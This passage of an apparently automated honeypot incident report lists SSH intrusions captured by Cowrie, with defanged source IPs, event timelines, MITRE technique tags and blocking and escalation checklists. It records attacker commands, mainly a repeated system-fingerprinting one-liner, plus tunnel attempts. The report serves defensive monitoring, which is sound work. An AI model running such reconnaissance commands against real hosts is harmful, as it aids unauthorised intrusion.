| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:58:15` | `cowrie.session.connect` |
| `2026-07-09 18:58:15` | `cowrie.client.version` |
| `2026-07-09 18:58:15` | `cowrie.client.kex` |
| `2026-07-09 18:58:17` | `cowrie.login.success` |
| `2026-07-09 18:58:18` | `cowrie.session.params` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.success` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:18` | `cowrie.command.input` |
| `2026-07-09 18:58:19` | `cowrie.log.closed` |
| `2026-07-09 18:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e5463ce77e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 18:59 |
| **Last Seen** | 2026-07-09 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 18:59:38` | `cowrie.session.connect` |
| `2026-07-09 18:59:38` | `cowrie.client.version` |
| `2026-07-09 18:59:38` | `cowrie.client.kex` |
| `2026-07-09 18:59:39` | `cowrie.login.success` |
| `2026-07-09 18:59:41` | `cowrie.session.params` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.success` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:41` | `cowrie.command.input` |
| `2026-07-09 18:59:42` | `cowrie.log.closed` |
| `2026-07-09 18:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-430e87a7beda

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-07-09 19:00 |
| **Last Seen** | 2026-07-09 19:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:00:06` | `cowrie.session.connect` |
| `2026-07-09 19:00:07` | `cowrie.client.version` |
| `2026-07-09 19:00:07` | `cowrie.client.kex` |
| `2026-07-09 19:00:08` | `cowrie.login.success` |
| `2026-07-09 19:00:08` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c68288a6309

| Field | Detail |
|---|---|
| **Source IP** | `47.254.44[.]103` |
| **First Seen** | 2026-07-09 19:00 |
| **Last Seen** | 2026-07-09 19:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:00:25` | `cowrie.session.connect` |
| `2026-07-09 19:00:25` | `cowrie.login.success` |
| `2026-07-09 19:00:26` | `cowrie.session.params` |
| `2026-07-09 19:00:26` | `cowrie.command.input` |
| `2026-07-09 19:00:26` | `cowrie.command.failed` |
| `2026-07-09 19:00:26` | `cowrie.command.input` |
| `2026-07-09 19:00:26` | `cowrie.command.failed` |
| `2026-07-09 19:00:26` | `cowrie.command.input` |
| `2026-07-09 19:00:28` | `cowrie.log.closed` |
| `2026-07-09 19:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.44[.]103` to AbuseIPDB if not already reported
- [ ] Block `47.254.44[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26f2c31cad2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 19:00 |
| **Last Seen** | 2026-07-09 19:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:00:51` | `cowrie.session.connect` |
| `2026-07-09 19:00:52` | `cowrie.client.version` |
| `2026-07-09 19:00:52` | `cowrie.client.kex` |
| `2026-07-09 19:00:58` | `cowrie.login.success` |
| `2026-07-09 19:01:00` | `cowrie.session.params` |
| `2026-07-09 19:01:00` | `cowrie.command.input` |
| `2026-07-09 19:01:02` | `cowrie.log.closed` |
| `2026-07-09 19:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-868ced171736

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:01 |
| **Last Seen** | 2026-07-09 19:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:01:01` | `cowrie.session.connect` |
| `2026-07-09 19:01:01` | `cowrie.client.version` |
| `2026-07-09 19:01:01` | `cowrie.client.kex` |
| `2026-07-09 19:01:03` | `cowrie.login.success` |
| `2026-07-09 19:01:04` | `cowrie.session.params` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.success` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:04` | `cowrie.command.input` |
| `2026-07-09 19:01:05` | `cowrie.log.closed` |
| `2026-07-09 19:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659a56ef2289

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:02 |
| **Last Seen** | 2026-07-09 19:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:02:24` | `cowrie.session.connect` |
| `2026-07-09 19:02:24` | `cowrie.client.version` |
| `2026-07-09 19:02:24` | `cowrie.client.kex` |
| `2026-07-09 19:02:26` | `cowrie.login.success` |
| `2026-07-09 19:02:27` | `cowrie.session.params` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.success` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:27` | `cowrie.command.input` |
| `2026-07-09 19:02:28` | `cowrie.log.closed` |
| `2026-07-09 19:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2688b302d70c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 19:02 |
| **Last Seen** | 2026-07-09 19:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:02:46` | `cowrie.session.connect` |
| `2026-07-09 19:02:46` | `cowrie.client.version` |
| `2026-07-09 19:02:46` | `cowrie.client.kex` |
| `2026-07-09 19:02:47` | `cowrie.login.success` |
| `2026-07-09 19:02:50` | `cowrie.session.params` |
| `2026-07-09 19:02:50` | `cowrie.command.input` |
| `2026-07-09 19:02:51` | `cowrie.log.closed` |
| `2026-07-09 19:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbec42c622f

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-07-09 19:03 |
| **Last Seen** | 2026-07-09 19:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:03:26` | `cowrie.session.connect` |
| `2026-07-09 19:03:27` | `cowrie.client.version` |
| `2026-07-09 19:03:27` | `cowrie.client.kex` |
| `2026-07-09 19:03:28` | `cowrie.login.success` |
| `2026-07-09 19:03:28` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75923163362b

| Field | Detail |
|---|---|
| **Source IP** | `129.222.172[.]38` |
| **First Seen** | 2026-07-09 19:03 |
| **Last Seen** | 2026-07-09 19:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:03:33` | `cowrie.session.connect` |
| `2026-07-09 19:03:33` | `cowrie.client.version` |
| `2026-07-09 19:03:33` | `cowrie.client.kex` |
| `2026-07-09 19:03:36` | `cowrie.login.success` |
| `2026-07-09 19:03:36` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.172[.]38` to AbuseIPDB if not already reported
- [ ] Block `129.222.172[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5bdc38cfa9

| Field | Detail |
|---|---|
| **Source IP** | `218.95.73[.]31` |
| **First Seen** | 2026-07-09 19:03 |
| **Last Seen** | 2026-07-09 19:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:03:46` | `cowrie.session.connect` |
| `2026-07-09 19:03:46` | `cowrie.client.version` |
| `2026-07-09 19:03:46` | `cowrie.client.kex` |
| `2026-07-09 19:03:48` | `cowrie.login.success` |
| `2026-07-09 19:03:49` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.95.73[.]31` to AbuseIPDB if not already reported
- [ ] Block `218.95.73[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-311f6f4f3077

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:03 |
| **Last Seen** | 2026-07-09 19:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:03:47` | `cowrie.session.connect` |
| `2026-07-09 19:03:47` | `cowrie.client.version` |
| `2026-07-09 19:03:47` | `cowrie.client.kex` |
| `2026-07-09 19:03:50` | `cowrie.login.success` |
| `2026-07-09 19:03:51` | `cowrie.session.params` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.success` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:51` | `cowrie.command.input` |
| `2026-07-09 19:03:52` | `cowrie.log.closed` |
| `2026-07-09 19:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7dcdf90eeb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:05 |
| **Last Seen** | 2026-07-09 19:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:05:11` | `cowrie.session.connect` |
| `2026-07-09 19:05:11` | `cowrie.client.version` |
| `2026-07-09 19:05:11` | `cowrie.client.kex` |
| `2026-07-09 19:05:13` | `cowrie.login.success` |
| `2026-07-09 19:05:14` | `cowrie.session.params` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.success` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.command.input` |
| `2026-07-09 19:05:14` | `cowrie.log.closed` |
| `2026-07-09 19:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c70f8309a330

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:06 |
| **Last Seen** | 2026-07-09 19:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:06:33` | `cowrie.session.connect` |
| `2026-07-09 19:06:34` | `cowrie.client.version` |
| `2026-07-09 19:06:34` | `cowrie.client.kex` |
| `2026-07-09 19:06:35` | `cowrie.login.success` |
| `2026-07-09 19:06:37` | `cowrie.session.params` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.success` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.command.input` |
| `2026-07-09 19:06:37` | `cowrie.log.closed` |
| `2026-07-09 19:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af1be4c4106a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:07 |
| **Last Seen** | 2026-07-09 19:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:07:56` | `cowrie.session.connect` |
| `2026-07-09 19:07:57` | `cowrie.client.version` |
| `2026-07-09 19:07:57` | `cowrie.client.kex` |
| `2026-07-09 19:07:58` | `cowrie.login.success` |
| `2026-07-09 19:08:00` | `cowrie.session.params` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.success` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.command.input` |
| `2026-07-09 19:08:00` | `cowrie.log.closed` |
| `2026-07-09 19:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9efa443ac47b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:09 |
| **Last Seen** | 2026-07-09 19:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:09:21` | `cowrie.session.connect` |
| `2026-07-09 19:09:21` | `cowrie.client.version` |
| `2026-07-09 19:09:21` | `cowrie.client.kex` |
| `2026-07-09 19:09:23` | `cowrie.login.success` |
| `2026-07-09 19:09:25` | `cowrie.session.params` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.success` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.command.input` |
| `2026-07-09 19:09:25` | `cowrie.log.closed` |
